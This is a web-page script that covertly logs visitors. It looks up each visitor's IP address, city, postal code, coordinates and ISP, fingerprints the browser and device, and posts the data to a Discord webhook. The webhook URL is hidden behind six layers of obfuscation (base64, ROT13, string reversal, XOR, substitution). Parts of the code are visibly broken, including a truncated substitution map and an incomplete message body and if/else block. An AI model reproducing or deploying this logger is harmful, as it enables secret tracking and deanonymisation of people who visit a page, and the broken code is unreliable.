  <script>
    // Multi-layer encrypted webhook URL

    // Custom decryption function with multiple layers
    function decryptWebhook(encrypted) {
      try {
        // Layer 1: Base64 decode
        let step1 = atob(encrypted);
        
        // Layer 2: Character shift cipher (ROT13 variant)
        let step2 = '';
        for (let i = 0; i < step1.length; i++) {
          let char = step1[i];
          if (char >= 'a' && char <= 'z') {
            step2 += String.fromCharCode(((char.charCodeAt(0) - 97 - 13 + 26) % 26) + 97);
          } else if (char >= 'A' && char <= 'Z') {
            step2 += String.fromCharCode(((char.charCodeAt(0) - 65 - 13 + 26) % 26) + 65);
          } else {
            step2 += char;
          }
        }
        
        // Layer 3: Reverse string
        let step3 = step2.split('').reverse().join('');
        
        // Layer 4: XOR with key
        const key = 'soosy2024';
        let step4 = '';
        for (let i = 0; i < step3.length; i++) {
          step4 += String.fromCharCode(step3.charCodeAt(i) ^ key.charCodeAt(i % key.length));
        }
        
        // Layer 5: Base64 decode again
        let step5 = atob(step4);
        
        // Layer 6: Character substitution decode
        let substitutionMap = {
          '0': 'h', '1': 't', '2': 'p', '3': 's', '4': ':', '5': '/', '6': '/', 
          '7': 'd', '8': 'i', '9': 'c', 'a': 'o', 'b': 'r', 'c': '.', 'd': 'm',
          'e': '/', 'f': 'a', 'g': 'l', 'h': 'w', 'i': 'b', 'j': 'k', 'k': 'u',

          'z': '6', 'A': '7', 'B': '8', 'C': '9', 'D': '0'
        };
        
        let decoded = '';
        for (let char of step5) {
          decoded += substitutionMap[char] || char;
        }
        
        return decoded;
      } catch (error) {
        console.error('Decryption failed:', error);
        return null;
      }
    }
    
    // Decrypt the webhook URL
    const DISCORD_WEBHOOK_URL = decryptWebhook(ENCRYPTED_WEBHOOK);
    
    async function getIPAndLocationInfo() {
      try {
        // Get IP and location data from multiple sources for reliability
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        
        const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
        const locationData = await locationResponse.json();
        
        return {
          ip: ipData.ip,
          country: locationData.country_name || 'Unknown',
          region: locationData.region || 'Unknown',
          city: locationData.city || 'Unknown',
          postal: locationData.postal || 'Unknown',
          latitude: locationData.latitude || 'Unknown',
          longitude: locationData.longitude || 'Unknown',
          timezone: locationData.timezone || 'Unknown',
          isp: locationData.org || 'Unknown',
          asn: locationData.asn || 'Unknown'
        };
      } catch (error) {
        console.error('Error getting IP/location:', error);
        return {
          ip: 'Unable to fetch',
          country: 'Unknown',
          region: 'Unknown',
          city: 'Unknown',
          postal: 'Unknown',
          latitude: 'Unknown',
          longitude: 'Unknown',
          timezone: 'Unknown',
          isp: 'Unknown',
          asn: 'Unknown'
        };
      }
    }

    function getBrowserInfo() {
      const ua = navigator.userAgent;
      let browserName = 'Unknown';
      let browserVersion = 'Unknown';
      
      // Detect browser
      if (ua.includes('Firefox')) {
        browserName = 'Firefox';
        browserVersion = ua.match(/Firefox\/(\d+)/)?.[1] || 'Unknown';
      } else if (ua.includes('Chrome') && !ua.includes('Edg')) {
        browserName = 'Chrome';
        browserVersion = ua.match(/Chrome\/(\d+)/)?.[1] || 'Unknown';
      } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
        browserName = 'Safari';
        browserVersion = ua.match(/Version\/(\d+)/)?.[1] || 'Unknown';
      } else if (ua.includes('Edg')) {
        browserName = 'Edge';
        browserVersion = ua.match(/Edg\/(\d+)/)?.[1] || 'Unknown';
      }
      
      return { browserName, browserVersion };
    }

    function getDeviceInfo() {
      const ua = navigator.userAgent;
      let deviceType = 'Desktop';
      let os = 'Unknown';
      
      // Detect device type
      if (/Mobile|Android|iPhone|iPad/.test(ua)) {
        deviceType = 'Mobile';
      } else if (/Tablet|iPad/.test(ua)) {
        deviceType = 'Tablet';
      }
      
      // Detect OS
      if (ua.includes('Windows')) os = 'Windows';
      else if (ua.includes('Mac')) os = 'macOS';
      else if (ua.includes('Linux')) os = 'Linux';
      else if (ua.includes('Android')) os = 'Android';
      else if (ua.includes('iOS')) os = 'iOS';
      
      return { deviceType, os };
    }

    async function sendDiscordNotification() {
      const status = document.getElementById('status');
      status.textContent = 'Collecting data...';
      
      try {
        // Get all visitor information
        const ipLocationInfo = await getIPAndLocationInfo();
        const browserInfo = getBrowserInfo();
        const deviceInfo = getDeviceInfo();
        
        const visitorInfo = {
          timestamp: new Date().toLocaleString(),
          userAgent: navigator.userAgent,
          language: navigator.language,
          languages: navigator.languages?.join(', ') || navigator.language,
          platform: navigator.platform,
          screenResolution: `${screen.width}x${screen.height}`,
          windowSize: `${window.innerWidth}x${window.innerHeight}`,
          colorDepth: screen.colorDepth,
          pixelDepth: screen.pixelDepth,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          url: window.location.href,
          referrer: document.referrer || 'Direct visit',
          cookiesEnabled: navigator.cookieEnabled,
          onlineStatus: navigator.onLine,
          doNotTrack: navigator.doNotTrack || 'Not set',
          javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
          ...ipLocationInfo,
          ...browserInfo,
          ...deviceInfo
        };

        status.textContent = 'Sending notification...';

        // Create Discord embed message with more detailed information
        const discordMessage = {
          embeds: [{
            title: "🌐 New Website Visitor Detected",
            color: 0x00ff00, // Green color
            fields: [
              {

        // Send to Discord webhook
        const response = await fetch(DISCORD_WEBHOOK_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(discordMessage)
        });

        if (response.ok) {
          status.textContent = '✅ Visitor logged successfully';
          status.style.color = '#4CAF50';

        status.textContent = '❌ Logging failed';
        status.style.color = '#f44336';
